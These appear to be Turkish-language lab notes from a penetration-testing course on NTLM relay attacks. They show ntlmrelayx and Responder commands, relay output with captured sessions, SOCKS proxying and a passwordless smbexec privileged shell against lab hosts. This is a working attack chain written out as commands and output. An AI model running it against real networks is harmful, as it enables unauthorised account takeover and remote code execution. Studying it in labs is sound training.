# Extra Use Cases

## Multi-Relay Feature

Aşağıdaki kullanımda multi-relay özelliği kapalı (birden fazla bağlantı aynı anda geldiğinde hatalı relay gerçekleşebilir):

!!! abstract

    * Herhangi bir bilgisayar üzerinden, herhangi bir kullanıcı tarafından, herhangi bir sayıda kimlik doğrulama bağlantısı başlatılır.
    * Gelen ilk bağlantı SMB üzerinden 172.16.117.50 relay adresine aktarılır.

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t smb://172.16.117.50
```

Aşağıdaki kullanımda multi-relay özelliği açık:

!!! abstract

    * Herhangi bir bilgisayar üzerinden, herhangi bir kullanıcı tarafından, herhangi bir sayıda kimlik doğrulama bağlantısı başlatılır.
    * Gelen tüm bağlantılar SMB üzerinden 172.16.117.50 relay adresine aktarılır.

```sh
htb-student@ubuntu:~$ echo "smb://172.16.117.50" | sudo tee relays.txt
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf relays.txt
```

Aşağıdaki kullanımda multi-relay özelliği açık:

!!! abstract

    * Herhangi bir bilgisayar üzerinden, PETER tarafından, herhangi bir sayıda kimlik doğrulama bağlantısı başlatılır.
    * Gelen tüm bağlantılar SMB üzerinden 172.16.117.50 relay adresine aktarılır.

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t smb://INLANEFREIGHT\\'PETER'@172.16.117.50
```

Aşağıdaki kullanımda multi-relay özelliği kapalı (birden fazla bağlantı aynı anda geldiğinde hatalı relay gerçekleşebilir):

!!! abstract

    * Herhangi bir bilgisayar üzerinden, PETER tarafından, herhangi bir sayıda kimlik doğrulama bağlantısı başlatılır.
    * Gelen ilk bağlantı SMB üzerinden 172.16.117.50 relay adresine aktarılır.

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -t smb://INLANEFREIGHT\\'PETER'@172.16.117.50 --no-multirelay
```

## Disabling Responder SMB

```ini title="Responder.conf" linenums="10"
SMB      = Off
```

## Responder

```sh
htb-student@ubuntu:~$ sudo Responder.py -I ens192
```

## Launching SOCKS Proxy

```sh
htb-student@ubuntu:~$ sudo ntlmrelayx.py -tf relays.txt -smb2support -socks
```

```output title="Output" hl_lines="3 6 9 12 15"
[*] SMBD-Thread-16: Connection from INLANEFREIGHT/NPORTS@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/NPORTS SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/NPORTS@172.16.117.60(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-18: Connection from INLANEFREIGHT/RMONTY@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/RMONTY SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/RMONTY@172.16.117.60(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-17: Connection from INLANEFREIGHT/JPEREZ@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/JPEREZ SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/JPEREZ@172.16.117.50(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-12: Connection from INLANEFREIGHT/PETER@172.16.117.3 controlled, attacking target smb://172.16.117.50
[*] Authenticating against smb://172.16.117.50 as INLANEFREIGHT/PETER SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/PETER@172.16.117.50(445) to active SOCKS connection. Enjoy
[*] SMBD-Thread-12: Connection from INLANEFREIGHT/PETER@172.16.117.3 controlled, attacking target smb://172.16.117.60
[*] Authenticating against smb://172.16.117.60 as INLANEFREIGHT/PETER SUCCEED
[*] SOCKS: Adding INLANEFREIGHT/PETER@172.16.117.60(445) to active SOCKS connection. Enjoy
```

## Listing Sessions

```sh
ntlmrelayx> socks
```

```output title="Output" hl_lines="4 6"
Protocol  Target         Username              AdminStatus  Port
--------  -------------  --------------------  -----------  ----
SMB       172.16.117.60  INLANEFREIGHT/NPORTS  FALSE        445
SMB       172.16.117.60  INLANEFREIGHT/RMONTY  FALSE        445
SMB       172.16.117.50  INLANEFREIGHT/JPEREZ  FALSE        445
SMB       172.16.117.50  INLANEFREIGHT/PETER   TRUE         445
SMB       172.16.117.60  INLANEFREIGHT/PETER   FALSE        445
```

## Using Authenticated Session

!!! success

    Geçerli bir oturum sayesinde parola olmadan bağlantı kurulabilir.

### Proxychains Configuration File

```sh
my@ubuntu:~$ tail /etc/proxychains.conf
```

```ini title="Output" hl_lines="9"
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

### Connecting the Share

```sh
htb-student@ubuntu:~$ proxychains -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.60 -no-pass
```

| COMMAND | DESCRIPTION |
|---|---|
| shares | Mevcut paylaşımları listele. |
| use | Bir paylaşıma bağlan. |

### Privileged Shell

```sh
htb-student@ubuntu:~$ proxychains -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass
```
